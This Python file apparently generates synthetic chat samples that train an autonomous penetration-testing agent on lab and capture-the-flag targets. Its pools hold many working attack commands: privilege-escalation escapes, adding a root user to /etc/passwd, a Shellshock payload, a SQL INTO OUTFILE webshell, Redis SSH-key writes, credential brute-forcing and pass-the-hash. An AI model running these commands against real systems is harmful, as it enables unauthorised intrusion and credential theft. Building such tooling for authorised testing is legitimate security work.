        return f"searchsploit {svc_name}", "\n".join(lines), disc[:4], "advance", f"Found {len(results)} exploits for {svc_name}"

    def _curl_response(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        scenario = r.choice(["api_leak", "debug_page", "config_leak", "error_page", "login_comment", "api_docs", "git_exposed", "env_leak", "xmlrpc"])
        disc, lines = [], []
        if scenario == "api_leak":
            endpoint = r.choice(["/api/v1/users", "/api/v1/config", "/api/users", "/api/admin", "/graphql"])
            u, p = r.choice(_USERNAMES_POOL[:5]), r.choice(_PASSWORDS_POOL)
            data = r.choice([
                f'{{"users":[{{"id":1,"username":"{u}","role":"admin"}}]}}',
                f'{{"status":"ok","debug":true,"database":"mysql://{u}:{p}@localhost/webapp"}}',
                f'{{"config":{{"secret_key":"{r.randint(10**12,10**15)}","admin_email":"{u}@target.com"}}}}',
            ])
            lines = ["HTTP/1.1 200 OK", "Content-Type: application/json", "", data]
            disc.append({"type": "file", "value": f"{endpoint} API accessible", "confidence": 0.9})
            if p in data:
                disc.append({"type": "credential", "value": f"Credentials in API response: {u}:{p}", "confidence": 0.95})
            cmd = f"curl -s http://{ip}{endpoint}"
        elif scenario == "debug_page":
            lines = ["Werkzeug Debugger", f"PIN: {r.randint(100,999)}-{r.randint(100,999)}-{r.randint(100,999)}", f"Python version: {r.choice(['3.8.10', '3.9.7', '3.10.4'])}"]
            disc.append({"type": "vuln", "value": "Werkzeug debugger console exposed", "confidence": 0.98})
            cmd = f"curl -s http://{ip}/console"
        elif scenario == "config_leak":
            fmt = r.choice(["php", "env", "xml"])
            u, p = r.choice(_USERNAMES_POOL[:5]), r.choice(_PASSWORDS_POOL)
            if fmt == "php":
                lines = [f"$db_host = 'localhost';", f"$db_user = '{u}';", f"$db_pass = '{p}';"]
                disc.append({"type": "credential", "value": f"MySQL {u}:{p}", "confidence": 0.99})
                cmd = f"curl -s http://{ip}/config.php.bak"
            elif fmt == "env":
                lines = [f"DB_USER={u}", f"DB_PASSWORD={p}", f"SECRET_KEY={r.randint(10**15,10**16)}", "DEBUG=true"]
                disc.append({"type": "credential", "value": f"DB {u}:{p}", "confidence": 0.99})
                disc.append({"type": "vuln", "value": ".env exposed", "confidence": 0.99})
                cmd = f"curl -s http://{ip}/.env"
            else:
                lines = [f'<Resource name="jdbc/webapp" username="{u}" password="{p}"/>']
                disc.append({"type": "credential", "value": f"JDBC {u}:{p}", "confidence": 0.99})
                cmd = f"curl -s http://{ip}/WEB-INF/web.xml"
        elif scenario == "error_page":
            table = r.choice(["users", "accounts", "employees", "products", "orders"])
            lines = ["HTTP/1.1 500", "Traceback:", f'  cursor.execute(f"SELECT * FROM {table} WHERE id={{request.args[\'id\']}}")', "OperationalError: syntax error"]
            disc.append({"type": "vuln", "value": f"SQL injection via error disclosure ({table})", "confidence": 0.9})
            cmd = f"curl -s 'http://{ip}/view?id=1'"
        elif scenario == "login_comment":
            u, p = r.choice(_USERNAMES_POOL[:5]), r.choice(_PASSWORDS_POOL)
            lines = ["<form action='/login' method='POST'>", f"  <!-- debug: {u}/{p} -->", "</form>"]
            disc.append({"type": "credential", "value": f"{u}/{p} (HTML comment)", "confidence": 0.9})
            cmd = f"curl -s http://{ip}/login"
        elif scenario == "git_exposed":
            lines = [f"ref: refs/heads/{r.choice(['main', 'master', 'develop'])}", f"[remote \"origin\"]", f"\turl = https://github.com/company/{r.choice(['webapp', 'api', 'backend', 'frontend'])}.git"]
            disc.append({"type": "vuln", "value": ".git directory exposed — source code leak", "confidence": 0.99})
            cmd = f"curl -s http://{ip}/.git/HEAD"
        elif scenario == "env_leak":
            u, p = r.choice(_USERNAMES_POOL[:5]), r.choice(_PASSWORDS_POOL)
            aws_key = f"AKIA{''.join(r.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ234567', k=16))}"
            lines = [f"DB_HOST=localhost", f"DB_USER={u}", f"DB_PASSWORD={p}", f"AWS_ACCESS_KEY_ID={aws_key}", "DEBUG=1"]
            disc.append({"type": "credential", "value": f"DB {u}:{p}", "confidence": 0.99})
            disc.append({"type": "credential", "value": f"AWS key: {aws_key[:10]}...", "confidence": 0.99})
            cmd = f"curl -s http://{ip}/.env"
        elif scenario == "xmlrpc":
            lines = ["<?xml version='1.0'?>", "<methodResponse>", "  <params><param><value><array><data>",
                      "    <value><string>system.listMethods</string></value>",
                      "    <value><string>wp.getUsersBlogs</string></value>",
                      "    <value><string>wp.getAuthors</string></value>",
                      "  </data></array></value></param></params>", "</methodResponse>"]
            disc.append({"type": "vuln", "value": "XML-RPC enabled — brute force/SSRF possible", "confidence": 0.9})
            cmd = f"curl -s -X POST http://{ip}/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'"
        else:
            lines = ["Swagger UI", "API Version: 2.0", "  POST /api/auth/login", "  GET /api/users", "  POST /api/upload"]
            disc.append({"type": "file", "value": "Swagger API docs exposed", "confidence": 0.9})
            cmd = f"curl -s http://{ip}/swagger"
        return cmd, "\n".join(lines), disc[:4], "advance" if disc else "stay", f"HTTP analysis: {len(disc)} findings"

    def _dns_enum(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        domain = r.choice(["target.htb", "corp.local", "internal.domain", "test.local", "dev.company.com", "hackme.htb", "active.htb"])
        tool = r.choice(["dig", "dnsrecon", "fierce", "dnsenum"])
        subs = r.sample(["www", "mail", "ftp", "admin", "dev", "staging", "api", "internal", "vpn", "git", "ci", "jenkins", "grafana", "db", "backup", "ns1", "mx"], r.randint(2, 6))
        lines, disc = [], []
        for sub in subs:
            sub_ip = _rand_ip()
            lines.append(f"{sub}.{domain}\t{sub_ip}")
            disc.append({"type": "service", "value": f"{sub}.{domain} -> {sub_ip}", "confidence": 0.9})
        return f"{tool} {'axfr @' + ip if tool == 'dig' else '-d'} {domain}", "\n".join(lines), disc[:6], "advance", f"DNS: {len(subs)} subdomains for {domain}"

    def _snmpwalk(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        community = r.choice(["public", "private", "manager", "admin", "community"])
        os_info = r.choice(["Linux target 5.4.0 #1 SMP x86_64", "Windows Server 2019 Standard", "Linux target 4.15.0 x86_64", "Cisco IOS 15.1(4)M4"])
        lines = [f"sysDescr.0 = STRING: {os_info}", f"sysName.0 = STRING: {r.choice(['target', 'server01', 'fw-01', 'router-01'])}"]
        disc = [{"type": "service", "value": f"SNMP: {os_info[:60]}", "confidence": 0.95}]
        if r.random() > 0.5:
            for i in range(r.randint(2, 4)):
                net_ip = _rand_ip()
                lines.append(f"ipAdEntAddr.{net_ip} = IpAddress: {net_ip}")
                disc.append({"type": "service", "value": f"Interface: {net_ip}", "confidence": 0.9})
        return f"snmpwalk -v2c -c {community} {ip}", "\n".join(lines), disc[:5], "advance", f"SNMP: OS={os_info[:30]}, community={community}"

    def _ldapsearch(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        domain = r.choice(["corp.local", "company.local", "domain.local", "ad.internal"])
        dc_parts = ",".join(f"DC={p}" for p in domain.split("."))
        users = r.sample(_USERNAMES_POOL[:20], r.randint(2, 6))
        lines, disc = [f"# extended LDIF", f"# base <{dc_parts}>"], []
        for u in users:
            lines.extend([f"dn: CN={u},CN=Users,{dc_parts}", f"sAMAccountName: {u}", f"memberOf: CN=Domain Users,CN=Users,{dc_parts}", ""])
            disc.append({"type": "user", "value": f"{u} (AD user)", "confidence": 0.95})
        if r.random() > 0.5:
            svc_user = r.choice(["svc_sql", "svc_web", "svc_backup", "svc_admin"])
            lines.extend([f"dn: CN={svc_user},CN=Users,{dc_parts}", f"sAMAccountName: {svc_user}", f"servicePrincipalName: MSSQLSvc/{ip}:1433"])
            disc.append({"type": "user", "value": f"{svc_user} (service account with SPN — Kerberoastable)", "confidence": 0.95})
        return f"ldapsearch -x -H ldap://{ip} -b '{dc_parts}'", "\n".join(lines), disc[:6], "advance", f"LDAP: {len(users)} users enumerated"

    def _mysql_enum(r: random.Random) -> tuple[str, str, list[dict], str, str]:
        ip = _rand_ip()
        u, p = r.choice(["root", "admin", "dbadmin"]), r.choice(_PASSWORDS_POOL[:10])
        dbs = r.sample(["information_schema", "mysql", "webapp", "users", "shop", "blog", "inventory", "hr", "finance"], r.randint(2, 5))
        lines = [f"Welcome to the MySQL monitor.", f"Server version: {r.choice(['5.7.38', '8.0.28', '8.0.33'])}", "", "+--------------------+", "| Database           |", "+--------------------+"]
        for db in dbs:
            lines.append(f"| {db:<18} |")
        lines.append("+--------------------+")
        disc = [{"type": "credential", "value": f"MySQL {u}:{p} (authenticated)", "confidence": 0.99}]
        for db in dbs:
            if db not in ("information_schema", "mysql"):
                disc.append({"type": "file", "value": f"Database: {db}", "confidence": 0.95})
        return f"mysql -h {ip} -u {u} -p'{p}' -e 'SHOW DATABASES;'", "\n".join(lines), disc[:5], "advance", f"MySQL access: {len(dbs)} databases"

    # ── Generate from all dynamic builders ──
    builders = [
        (_nmap, 250, "RECON"), (_web_enum, 250, "ENUMERATION"),
        (_smb_enum, 200, "ENUMERATION"), (_hydra, 200, "EXPLOITATION"),
        (_sqlmap, 150, "EXPLOITATION"), (_linpeas, 250, "PRIVILEGE_ESCALATION"),
        (_nikto, 200, "ENUMERATION"), (_wpscan, 150, "ENUMERATION"),
        (_tshark, 100, "POST_EXPLOITATION"), (_searchsploit, 100, "EXPLOITATION"),
        (_curl_response, 200, "ENUMERATION"), (_dns_enum, 100, "RECON"),
        (_snmpwalk, 80, "RECON"), (_ldapsearch, 80, "ENUMERATION"),
        (_mysql_enum, 80, "EXPLOITATION"),
    ]
    for build_fn, count, phase in builders:
        for _ in range(count):
            cmd, output, disc, impact, summary = build_fn(rng)
            if not disc:
                continue
            agent = _pick_agent(phase, "tool_output_parse")
            response = json.dumps({"discoveries": disc, "phase_impact": impact, "summary": summary})
            samples.append(Sample(
                task="tool_output_parse",
                messages=[
                    {"role": "system", "content": _sys("tool_output_parse", agent)},
                    {"role": "user", "content": f"Parse this tool output:\n\nCommand: {cmd}\n\nOutput:\n{output}"},
                    {"role": "assistant", "content": response},
                ],
                metadata={"synthetic": True, "agent": agent, "source": "synthetic_tool_v2"},
                quality=0.93,
            ))
    return samples


def gen_synthetic_postmortems_v2() -> list[Sample]:
    """1200+ unique postmortem narratives via component mixing."""
    samples: list[Sample] = []
    rng = random.Random(SEED + 101)

    ACCESS_METHODS = [
        "FTP anonymous login to config files", "SQL injection on login form",
        "WordPress plugin RCE (wp-file-manager)", "Default Tomcat manager creds",
        "SMB null session user enumeration + password spray", "PCAP file with cleartext FTP creds",
        "SSH brute-force with targeted wordlist", "LFI via parameter fuzzing to log poisoning",
        "vsftpd 2.3.4 backdoor on port 6200", "Apache 2.4.49 path traversal CVE-2021-41773",
        "Redis unauthenticated write to webroot", "NFS no_root_squash SUID binary",
        "Jenkins Groovy script console RCE", "Elasticsearch unauthenticated access",
        "Drupalgeddon2 RCE (CVE-2018-7600)", "UnrealIRCd backdoor exploit",
        "Samba usermap_script RCE (CVE-2007-2447)", "ProFTPD mod_copy arbitrary file write",
        "MongoDB unauthenticated database dump", "phpMyAdmin default credentials",
        "Webmin pre-auth RCE (CVE-2019-15107)", "Grafana path traversal (CVE-2021-43798)",
        "GitLab SSRF to internal services", "Jira unauthenticated access",
        "SNMP community string leak revealing network info", "SMTP user enumeration via VRFY",
        "Memcached unauthenticated cache dump with session tokens",
        "Docker API exposed on port 2375", "Kubernetes API server unauthenticated",
        "Shellshock CGI RCE (CVE-2014-6271)", "Heartbleed memory leak (CVE-2014-0160)",
    ]

    ESCALATION_METHODS = [
        "python3 cap_setuid to root", "sudo NOPASSWD vim escape",
        "writable cron job hijacking", "Docker group mount host filesystem",
        "kernel OverlayFS exploit (CVE-2021-3493)", "DirtyPipe (CVE-2022-0847)",
        "DirtyCow (CVE-2016-5195)", "SUID find -exec to root",
        "writable /etc/passwd — added root user", "LXD group container escape",
        "PATH hijacking via writable directory", "LD_PRELOAD injection",
        "sudo awk BEGIN system escape", "SUID env /bin/sh -p",
        "pkexec PwnKit (CVE-2021-4034)", "Baron Samedit sudo heap overflow (CVE-2021-3156)",
        "NFS root_squash bypass", "systemd timer injection",
        "screen 4.5.0 local root exploit", "MySQL UDF shared library root",
        "Python library hijacking via writable sys.path", "Ansible playbook injection",
        "Polkit bypass (CVE-2021-3560)", "snap confine CVE-2022-3328",
    ]

    WINS_POOL = [
        "Found credentials via anonymous FTP", "Escalated to root via python3 capability",
        "Identified SQL injection on first form tested", "Credential reuse from DB to SSH worked",
        "wpscan found vulnerable plugin immediately", "Extracted hash from /etc/shadow and cracked it",
        "PCAP analysis revealed cleartext credentials", "Found writable cron script in first enum pass",
        "Version-specific CVE search found direct exploit", "Null session revealed all domain users",
        "Docker group membership gave instant root", "SUID binary found with linpeas",
        "Default credentials worked on first try", "Kernel version matched known exploit",
        "Log poisoning via LFI gave webshell", "Tomcat WAR upload gave reverse shell",
        "Redis write to authorized_keys gave SSH root", "Jenkins script console gave RCE",
        "NFS mount with no_root_squash gave file access", "SNMP walk revealed internal network topology",
        "Parameter fuzzing found hidden API endpoint", "Source code in .git exposed credentials",
        "Backup file contained database dump with hashes", "SSRF to internal metadata service",
    ]

    FAILS_POOL = [
        "Spent 5 steps on web scanning with no results", "Initially focused on wrong service",
        "Wasted time on directory brute-forcing", "Manual SQLi attempts failed",
        "Tried SSH before discovering easier entry point", "Missed share enumeration initially",
        "Generic scanning tools missed CMS-specific vulns", "Brute-force attempted before info gathering",
        "Extensive port scanning found very limited surface", "Standard scanning stalled at enumeration",
        "Nikto was too slow and timed out", "Wrong exploit version selected",
        "Reverse shell connection dropped multiple times", "Kernel exploit compilation failed first try",
        "Missed obvious SUID binary on first pass", "Focused on authenticated attack without creds",
        "UDP scan was never attempted", "DNS zone transfer not tried early enough",
        "Skipped anonymous FTP check", "SNMP enumeration not performed",
        "Tried complex exploit when simple default creds worked", "Automated scan missed manual injection point",
    ]

    LESSONS_POOL = [
        "When FTP is open: always check anonymous access first",
        "When login form exists: test for SQL injection with automated tools",
        "When SMB ports open: check null session and enumerate shares/users",
        "When web CMS detected: use CMS-specific scanner (wpscan/droopescan)",
        "When downloadable files served: analyze for credentials before brute-forcing",
        "When only SSH available: focus on credential attacks with custom wordlists",
        "When standard scanning fails: fuzz URL parameters for injection points",
        "After gaining shell: check sudo, SUID, capabilities, cron before kernel exploits",
        "Credential reuse across services is the fastest lateral movement technique",
        "Check kernel version immediately on shell access for known exploits",
        "CMS detection should trigger CMS-specific scanner, not generic tools",
        "Docker/LXD group membership is instant root — check groups first",
        "DNS zone transfer can reveal entire internal network topology",
        "SNMP community strings often default — always try public/private",
        "Redis/MongoDB/Elasticsearch without auth are common easy wins",
        "Backup files (.bak, .old, .zip) on web servers often contain credentials",
        "PCAP files can contain cleartext credentials for multiple services",
        "API documentation (Swagger) can reveal authentication bypass paths",
        "Git repositories exposed via web contain source code and secrets",
        "Internal services reachable via SSRF bypass network segmentation",
        "Default credentials should be tested on every discovered service",
        "Log files (/var/log/auth.log, access.log) may contain leaked passwords",
        "Writable cron jobs are the most reliable privilege escalation on Linux",
        "SUID binaries with GTFOBins entries are direct root paths",
    ]

    for _ in range(1200):
        access = rng.choice(ACCESS_METHODS)
        escalation = rng.choice(ESCALATION_METHODS)
        wins = rng.sample(WINS_POOL, rng.randint(1, 3))
        fails = rng.sample(FAILS_POOL, rng.randint(1, 3))
        lesson = rng.choice(LESSONS_POOL)

        summary = f"{access} led to initial access, {escalation} for root"
        root_cause = rng.choice(fails)
        missed = rng.sample([
            f"Should have checked {access.split()[0]} earlier",
            "Version-specific CVE check was skipped",
            "Default credential testing not done systematically",
            "Enumeration depth was insufficient",
            "Automated tools missed custom vulnerabilities",
        ], rng.randint(1, 3))
        corrected = [
            f"Use {access.split()[0]} enumeration early",
            f"Apply {escalation.split()[0]} escalation check on shell",
            "Run full service enumeration before exploitation",
        ]

        response = json.dumps({
            "root_cause": root_cause[:200],
            "missed_signals": missed[:5],
            "corrected_path": corrected[:5],
            "key_lesson": lesson[:200],
        })

        user_prompt = (
            f"Analyze this penetration testing engagement:\n\n"
            f"Run: synthetic_{rng.randint(100000, 999999)}\n"
            f"Summary: {summary}\n"
            f"Successes: {'; '.join(wins[:3])}\n"
            f"Failures: {'; '.join(fails[:3])}\n"
        )

        samples.append(Sample(
            task="postmortem",
            messages=[
                {"role": "system", "content": _sys("postmortem", "OrionAgent")},
                {"role": "user", "content": user_prompt},
                {"role": "assistant", "content": response},
            ],
            metadata={"synthetic": True, "agent": "OrionAgent", "source": "synthetic_postmortem_v2"},
            quality=0.92,
        ))
    return samples


def gen_synthetic_retrieval_reasoning_v2() -> list[Sample]:
    """1500+ unique retrieval reasoning via component mixing."""
    samples: list[Sample] = []
    rng = random.Random(SEED + 102)

    CURRENT_STATES = [
        {"phase": "RECON", "state": "Ports: {p1}, {p2}\nServices: detecting...", "desc": "Initial scan shows {p1_svc} and {p2_svc}"},
        {"phase": "RECON", "state": "Ports: {p1}, {p2}, {p3}\nServices: {s1}", "desc": "Multiple ports found, {s1} identified"},
        {"phase": "ENUMERATION", "state": "Ports: {p1}, {p2}, {p3}\nServices: {s1}, {s2}\nRunning deep enumeration", "desc": "Services identified, deep probing underway"},
        {"phase": "ENUMERATION", "state": "Ports: {p1}, {p2}\nServices: {s1}\nWeb directories found: /admin, /api", "desc": "Web application with admin panel discovered"},
        {"phase": "EXPLOITATION", "state": "Vuln: {vuln}\nServices: {s1}\nAttempting exploitation", "desc": "Vulnerability confirmed, exploiting"},
        {"phase": "EXPLOITATION", "state": "Services: {s1}\nCredentials: {cred}\nAttempting authenticated access", "desc": "Credentials found, testing access"},
        {"phase": "PRIVILEGE_ESCALATION", "state": "Shells: {user}@target\nSUID: {suid}\nChecking escalation", "desc": "User shell obtained, escalation vectors found"},
        {"phase": "PRIVILEGE_ESCALATION", "state": "Shells: {user}@target\nsudo -l: {sudo}\nAttempting escalation", "desc": "Sudo misconfiguration found"},
        {"phase": "LATERAL_MOVEMENT", "state": "Shells: root@{ip1}\nCredentials: {cred}\nNew target: {ip2}", "desc": "Root on first host, pivoting with credentials"},
        {"phase": "POST_EXPLOITATION", "state": "Shells: root@target\nFlags: user.txt\nSearching for root.txt", "desc": "Root access, collecting flags"},
    ]

    PRIOR_KNOWLEDGE = [
        "Similar targets often run Python web frameworks. Check for Werkzeug debug console at /console.",
        "Multi-service targets: FTP anonymous first, then SMB null session, then web enum.",
        "MySQL default credentials frequently work: root:root, root:'', admin:admin.",
        "WordPress: use wpscan for plugin enum. wp-file-manager < 6.9 has RCE.",
        "vsftpd 2.3.4 has backdoor — send :) in USER field for shell on port 6200.",
        "Apache 2.4.49 CVE-2021-41773: path traversal via cgi-bin for RCE.",
        "env SUID: instant root via /usr/bin/env /bin/sh -p (GTFOBins).",
        "awk sudo escape: sudo awk 'BEGIN {system(\"/bin/bash\")}'.",
        "Kernel 4.15.0 vulnerable to CVE-2021-3493 OverlayFS.",
        "Credential reuse is the fastest lateral movement technique.",
        "root.txt usually in /root/. Also check /root/flag.txt and /root/proof.txt.",
        "Mail services: enumerate users via SMTP VRFY/EXPN for username discovery.",
        "Tomcat manager: deploy WAR file for webshell with valid credentials.",
        "Redis without auth: write SSH key to /root/.ssh/authorized_keys for root.",
        "LFI can lead to RCE via log poisoning — inject PHP in User-Agent, include access.log.",
        "PostgreSQL COPY TO PROGRAM for OS command execution with db credentials.",
        "Docker group: docker run -v /:/mnt --rm alpine chroot /mnt sh for root.",
        "NFS no_root_squash: mount share, create SUID binary, execute on target.",
        "SNMP walk reveals network topology, OS version, and running processes.",
        "Jenkins script console allows direct Groovy command execution for RCE.",
        "Elasticsearch without auth: query /_search for indexed sensitive data.",
        "MongoDB without auth: show dbs, use admin, db.getUsers() for credentials.",
        "Webmin < 1.920: password_change.cgi allows unauthenticated RCE.",
        "vim sudo escape: sudo vim -c ':!/bin/bash' for instant root shell.",
        "find SUID: find . -exec /bin/sh -p \\; for root shell.",
        "screen 4.5.0 has local root exploit — check version on shell access.",
        "Shellshock: curl -H 'User-Agent: () { :; }; echo; /bin/id' on CGI endpoints.",
        "phpMyAdmin: SQL query SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE for webshell.",
        "Kerberoasting: request service tickets for offline cracking of AD service accounts.",
        "Pass-the-hash with impacket-psexec for domain lateral movement.",
        "LDAP anonymous bind can reveal entire AD structure including service accounts.",
        "SSH key reuse: check /home/*/.ssh/ for authorized_keys matching other hosts.",
        "Python library hijacking: writable directory in sys.path allows code injection.",
        "Ansible playbook injection: writable playbooks run with elevated privileges.",
        "Grafana 8.x: /public/plugins/.. path traversal for file read (CVE-2021-43798).",
    ]

    ACTIONS_BY_PHASE = {
        "RECON": [
            "nmap -sV -sC -p- {ip}", "masscan {ip}/24 -p 1-65535 --rate=1000",
            "rustscan -a {ip} -- -sV -sC", "nmap -sU --top-ports 100 {ip}",
            "dig axfr @{ip} target.htb", "ftp {ip}", "snmpwalk -v2c -c public {ip}",
        ],
        "ENUMERATION": [
            "gobuster dir -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt",
            "wpscan --url http://{ip} --enumerate u,ap,t --plugins-detection aggressive",
            "enum4linux -a {ip}", "nikto -h http://{ip}", "smbclient -L //{ip}/ -N",
            "ffuf -u http://{ip}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt",
            "nuclei -target http://{ip} -t cves/", "ldapsearch -x -H ldap://{ip}",
            "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {ip}",
            "mysql -h {ip} -u root -e 'SHOW DATABASES;'",
        ],
        "EXPLOITATION": [
            "sqlmap -u 'http://{ip}/page?id=1' --batch --os-shell",
            "hydra -l admin -P /usr/share/wordlists/rockyou.txt {ip} ssh",
            "curl 'http://{ip}/cgi-bin/.%%2e/%%2e%%2e/bin/bash' -d 'echo;id'",
            "ncat {ip} 6200 -v", "searchsploit apache 2.4.49",
            "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor'",
            "redis-cli -h {ip} CONFIG SET dir /var/www/html",
            "curl -u 'tomcat:tomcat' --upload-file shell.war http://{ip}:8080/manager/text/deploy?path=/shell",
            "impacket-GetUserSPNs -request -dc-ip {ip} DOMAIN/user:Password1",
        ],
        "PRIVILEGE_ESCALATION": [
            "sudo vim -c ':!/bin/bash'", "/usr/bin/env /bin/sh -p",
            "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "sudo awk 'BEGIN {{system(\"/bin/bash\")}}'",
            "sudo find . -exec /bin/sh -p \\;",
            "echo 'root2:$(openssl passwd -1 toor):0:0:root:/root:/bin/bash' >> /etc/passwd",
            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "getcap -r / 2>/dev/null",
        ],
        "LATERAL_MOVEMENT": [
            "ssh {user}@{ip2} -o StrictHostKeyChecking=no",
            "proxychains nmap -sT -p 22,80,445 {ip2}",
            "chisel server -p 8000 --reverse",
            "impacket-psexec DOMAIN/{user}:{pass}@{ip2}",
            "crackmapexec smb {ip2} -u {user} -p {pass} --shares",
        ],
        "POST_EXPLOITATION": [
            "cat /root/root.txt", "find / -name '*.txt' -o -name 'flag*' 2>/dev/null",
            "cat /etc/shadow", "ls -la /home/*/", "hashdump",
        ],
    }

    VULNS_POOL = [
        "SQL injection on /login?id=", "Apache 2.4.49 path traversal",
        "vsftpd 2.3.4 backdoor", "Samba 3.0.20 username map script RCE",
        "WordPress wp-file-manager RCE", "Drupalgeddon2 RCE",
        "UnrealIRCd backdoor", "Redis unauthenticated access",
        "Jenkins script console RCE", "Tomcat manager default credentials",
        "phpMyAdmin default credentials", "NFS no_root_squash misconfiguration",
        "Shellshock CGI RCE", "Log4Shell RCE", "Spring4Shell RCE",
    ]

    for _ in range(1500):
        state_template = rng.choice(CURRENT_STATES)
        phase = state_template["phase"]
        memory = rng.choice(PRIOR_KNOWLEDGE)
        ip = _rand_ip()
        ip2 = _rand_ip()

        # Fill template variables
        avail_ports = list(_PORT_SVC.keys())
        p1, p2, p3 = rng.sample(avail_ports, 3)
        s1_name, s1_vers = _PORT_SVC[p1]
        s2_name, s2_vers = _PORT_SVC[p2]
        s1 = rng.choice(s1_vers)
        s2 = rng.choice(s2_vers)
        user = rng.choice(_USERNAMES_POOL[:15])
        cred_pass = rng.choice(_PASSWORDS_POOL)
        cred = f"{user}:{cred_pass}"
        suid = rng.choice(_SUID_POOL)
        sudo = rng.choice(_SUDO_POOL)
        vuln = rng.choice(VULNS_POOL)

        state_str = state_template["state"].format(
            p1=p1, p2=p2, p3=p3, s1=s1, s2=s2,
            p1_svc=s1_name, p2_svc=s2_name,
            vuln=vuln, cred=cred, user=user, suid=suid, sudo=sudo,
            ip1=ip, ip2=ip2,
        )
        desc = state_template["desc"].format(
            p1_svc=s1_name, p2_svc=s2_name, s1=s1, s2=s2, vuln=vuln, cred=cred, user=user,
        )

        # Pick matching action
        phase_actions = ACTIONS_BY_PHASE.get(phase, ACTIONS_BY_PHASE["RECON"])
        action = rng.choice(phase_actions).format(ip=ip, ip2=ip2, user=user, **{"pass": cred_pass})

        synthesis = f"{desc}. Prior knowledge suggests: {memory[:80]}. "
        if "vuln" in memory.lower() or "exploit" in memory.lower() or "rce" in memory.lower():
            synthesis += "Known vulnerability may provide direct access."
        elif "privesc" in memory.lower() or "escalat" in memory.lower() or "root" in memory.lower():
            synthesis += "Escalation technique applicable to current context."
        elif "credential" in memory.lower() or "password" in memory.lower():
            synthesis += "Credential discovery path identified."
        else:
            synthesis += "Technique aligns with current phase objectives."

        agent = _pick_agent(phase, "retrieval_reasoning")
        response = json.dumps({
            "synthesis": synthesis[:250],
            "from_current": desc[:150],
            "from_memory": memory[:200],
            "action": action[:200],
            "confidence": round(rng.uniform(0.65, 0.97), 2),
        })

        full_state = f"Phase: {phase}\nTarget: {ip}\nStep: {rng.randint(5, 80)}\n{state_str}"

        samples.append(Sample(
            task="retrieval_reasoning",
            messages=[
                {"role": "system", "content": _sys("retrieval_reasoning", agent)},
                {"role": "user", "content": f"Current state:\n{full_state}\n\nPrior experience: {memory[:200]}\n\nSynthesize guidance."},
                {"role": "assistant", "content": response},
            ],
            metadata={"phase": phase, "synthetic": True, "agent": agent, "source": "synthetic_retrieval_v2"},
            quality=0.93,
        ))
    return samples


def gen_synthetic_retry_pivot_v2() -> list[Sample]:
    """1500+ unique retry/pivot scenarios via component mixing."""
    samples: list[Sample] = []
    rng = random.Random(SEED + 103)

    # Failure→Recovery pairs organized by category
    FAIL_RECOVER = [
        # Web scanning failures
        {"prev": "gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt", "decisions": [
            ("PIVOT", "ffuf -u http://{ip}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -mc 200,301,302,403", "Switching to ffuf with larger wordlist and wider status codes"),
            ("PIVOT", "feroxbuster -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3", "Pivoting to recursive deep scan with feroxbuster"),
            ("RETRY", "gobuster dir -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,txt,html,bak,old", "Retrying with bigger wordlist and more extensions"),
        ]},
        {"prev": "nikto -h http://{ip}", "decisions": [
            ("PIVOT", "wpscan --url http://{ip} --enumerate u,ap,t --plugins-detection aggressive", "Nikto generic — pivoting to CMS-specific scanner"),
            ("PIVOT", "nuclei -target http://{ip} -t cves/ -t vulnerabilities/", "Pivoting to nuclei for modern CVE scanning"),
            ("ESCALATE", "curl -s http://{ip}/ | grep -iE 'wordpress|drupal|joomla|django|flask'", "Escalating to CMS fingerprinting before specialized scanning"),
        ]},
        # Authentication failures
        {"prev": "hydra -l admin -P /usr/share/wordlists/rockyou.txt {ip} ssh -t 4", "decisions": [
            ("ESCALATE", "searchsploit openssh {ver}", "SSH brute force failed — escalating to exploit search for specific version"),
            ("RETRY", "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt {ip} ssh -t 4", "Retrying with username list instead of single user"),
            ("PIVOT", "enum4linux -a {ip}", "Pivoting to SMB enumeration for username discovery before retry"),
        ]},
        {"prev": "crackmapexec smb {ip} -u admin -p password123", "decisions": [
            ("RETRY", "crackmapexec smb {ip} -u admin -p '' --shares", "Retrying with null password and share listing"),
            ("RETRY", "crackmapexec smb {ip} -u '' -p '' --shares", "Retrying with completely null credentials"),
            ("PIVOT", "enum4linux -a {ip}", "Pivoting to full SMB enumeration with enum4linux"),
        ]},
        # Exploitation failures
        {"prev": "sqlmap -u 'http://{ip}/page?id=1' --batch", "decisions": [
            ("RETRY", "sqlmap -u 'http://{ip}/page?id=1' --batch --level=5 --risk=3 --tamper=space2comment", "Retrying with max level/risk and WAF bypass tamper"),
            ("RETRY", "sqlmap -u 'http://{ip}/page?id=1' --batch --forms --crawl=2", "Retrying with form detection and crawler"),
            ("PIVOT", "curl -s 'http://{ip}/page?id=1%27' -o /dev/null -w '%{{http_code}}'", "Manual SQL injection verification before automated scan"),
        ]},
        {"prev": "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {ip}; run'", "decisions": [
            ("ESCALATE", "curl -u 'tomcat:tomcat' http://{ip}:8080/manager/html", "Escalating to manual credential testing on Tomcat manager"),
            ("RETRY", "msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS {ip}; run'", "Retrying with alternative Tomcat exploit module"),
            ("PIVOT", "curl -s http://{ip}:8080/manager/status | head -20", "Pivoting to check manager status without auth"),
        ]},
        # Privilege escalation failures
